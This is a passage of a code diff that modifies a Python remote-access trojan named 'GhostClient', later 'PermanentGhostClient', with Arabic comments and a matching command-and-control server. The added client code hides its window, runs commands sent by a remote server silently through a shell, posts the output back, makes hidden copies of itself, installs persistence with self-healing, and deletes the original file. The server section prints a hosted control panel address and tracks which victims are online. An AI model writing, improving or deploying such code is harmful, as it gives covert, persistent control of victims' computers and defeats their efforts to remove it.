-                    print(f"🎯 Executing: {command}")
+                    print(f"⚡ Executing: {command}")
                     
                     # تنفيذ الأمر فوراً
-                    result = self.execute_command_immediately(command)
+                    result = self.execute_instant_command(command)
                     
-                    # إرسال النتيجة فوراً
+                    # إرسال النتيجة
                     requests.post(
                         f"{self.server_url}/response",
                         json={
@@ -1744,45 +1646,123 @@ class GhostClient:
         except:
             pass
     
+    def execute_instant_command(self, command):
+        """تنفيذ الأمر فوراً"""
+        try:
+            if command.strip() == "sysinfo":
+                return self.get_permanent_system_info()
+            elif command.strip() == "status":
+                return self.get_permanent_status()
+            elif command.strip() == "reinforce":
+                return self.reinforce_permanence()
+            else:
+                # تنفيذ الأوامر بدون نافذة
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = 0
+                
+                result = subprocess.run(
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=30,
+                    startupinfo=startupinfo
+                )
+                return result.stdout if result.stdout else result.stderr or "Command executed"
+                
+        except Exception as e:
+            return f"Error: {str(e)}"
+    
+    def get_permanent_system_info(self):
+        """معلومات النظام الدائمة"""
+        try:
+            info = f"""
+🔒 PERMANENT GHOST CLIENT - ETERNAL
+🖥️  Computer: {platform.node()}
+👤 User: {getpass.getuser()}
+💻 OS: {platform.system()} {platform.release()}
+🆔 Client ID: {self.client_id}
+🌐 Server: {self.server_url}
+
+🔧 PERMANENCE STATUS:
+✅ Hidden Copies: {len(self.hidden_paths)}
+✅ Main Path: {os.path.basename(self.script_path)}
+✅ Admin Rights: {'YES' if self.get_admin_privileges() else 'NO'}
+✅ Self-Healing: ACTIVE
+✅ Persistence: ETERNAL
+
+📊 OPERATIONAL:
+🔄 Connection: {'ESTABLISHED' if self.registered else 'ESTABLISHING'}
+⚡ Response: INSTANT
+🛡️ Protection: MAXIMUM
+"""
+            return info
+        except:
+            return "Permanent system information"
+    
+    def get_permanent_status(self):
+        """حالة الديمومة"""
+        return f"🔒 PERMANENT - Copies: {len(self.hidden_paths)} - Connected: {self.registered} - Eternal: YES"
+    
+    def reinforce_permanence(self):
+        """تعزيز الديمومة"""
+        try:
+            # إنشاء نسخ إضافية إذا لزم الأمر
+            if len(self.hidden_paths) < 2:
+                self.create_permanent_copies()
+            
+            # إعادة تثبيت الثبات
+            self.install_eternal_persistence()
+            
+            return "Permanence reinforced to maximum level"
+        except Exception as e:
+            return f"Reinforcement failed: {e}"
+    
+    def hide_completely(self):
+        """إخفاء كامل"""
+        try:
+            if os.name == 'nt':
+                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except:
+            pass
+    
     def start(self):
-        """بدء العميل"""
-        # إخفاء النافذة فوراً
-        self.hide_process()
+        """بدء العميل الدائم"""
+        # إخفاء فوري
+        self.hide_completely()
         
-        print("🚀 Initializing Ghost Client...")
+        print("🚀 Starting Permanent Ghost Client - Eternal Mode")
         
-        # 1. تنظيف النسخ القديمة أولاً
-        print("🧹 Cleaning old versions...")
-        clean_result = self.clean_old_versions()
-        print(f"✅ {clean_result}")
+        # 1. إنشاء نسخ دائمة مخفية
+        copy_result = self.create_permanent_copies()
+        print(f"📁 {copy_result}")
         
-        # 2. إخفاء وحماية الملف
-        print("🛡️ Hiding and protecting file...")
-        hide_result = self.hide_and_protect()
-        print(f"✅ {hide_result}")
+        # 2. تثبيت تشغيل تلقائي أبدي
+        persistence_result = self.install_eternal_persistence()
+        print(f"🔧 {persistence_result}")
         
-        # 3. تثبيت التشغيل التلقائي
-        print("🔧 Installing persistence...")
-        persistence_result = self.install_persistence()
-        print(f"✅ {persistence_result}")
+        # 3. بدء نظام الشفاء الذاتي الدائم
+        self.start_permanent_self_healing()
+        print("🔄 Permanent self-healing activated")
         
-        # 4. بدء أنظمة الحماية
-        print("⚙️ Starting protection systems...")
-        self.block_task_manager()
-        self.start_self_healing()
-        print("✅ Protection systems activated")
+        # 4. بدء الاتصال الفوري
+        self.start_instant_communication()
+        print("🌐 Instant communication started")
         
-        # 5. بدء الاتصال المستمر - الأسرع
-        print("🌐 Starting persistent connection...")
-        self.persistent_connection()
-        print("✅ Ghost Client activated - Fast auto-reconnect enabled")
+        # 5. ⚡ حذف الملف الأصلي فقط بعد التأكد من عمل النسخ المخفية
+        threading.Timer(10.0, self.delete_original_only).start()
+        print("🗑️ Original file deletion scheduled (hidden copies remain)")
         
-        # الحلقة الرئيسية الخفيفة
+        print("🎯 Permanent Ghost Client Activated - Eternal Operation")
+        print("💫 Hidden copies will run forever...")
+        
+        # الحلقة الرئيسية
         while self.running:
-            time.sleep(0.5)  # حلقة أسرع
+            time.sleep(1)
 
 def main():
-    client = GhostClient()
+    client = PermanentGhostClient()
     client.start()
 
 if __name__ == "__main__":
@@ -1862,7 +1842,7 @@ if __name__ == "__main__":
             for client_id, client_data in list(self.sessions.items()):
                 last_seen = datetime.fromisoformat(client_data['last_seen'])
                 if (current_time - last_seen).total_seconds() < 300:
-                    client_data['is_online'] = (current_time - last_seen).total_seconds() < 60
+                    client_data['is_online'] = (current_time - last_seen).total_seconds() < 30  # ⚡ غير من 60 إلى 30
                     active_clients.append(client_data)
                 else:
                     del self.sessions[client_id]
@@ -2013,7 +1993,7 @@ def main():
     
     threading.Thread(target=cleanup_sessions, daemon=True).start()
     print("=" * 70)
-    print("🔒 ENHANCED REMOTE CONTROL SERVER - MULTI LAYER SECURITY")
+    print("🔒 ENHANCED REMOTE CONTROL SERVER - ULTRA FAST")
     print("=" * 70)
     print("Control Panel:    https://game-python-1.onrender.com")
     print("Web Client:       https://game-python-1.onrender.com/remote")
@@ -2024,7 +2004,7 @@ def main():
     print("Database:         remote_control.db")
     print("=" * 70)
     print("Server starting on port 8080...")
-    print("Multi-layer security system activated")
+    print("ULTRA FAST mode activated - Instant responses")
     print("Password change feature enabled")
     print("=" * 70)
     
@@ -2043,4 +2023,4 @@ def main():
             handler.conn.close()
 
 if __name__ == "__main__":
-    main()
+    main()    
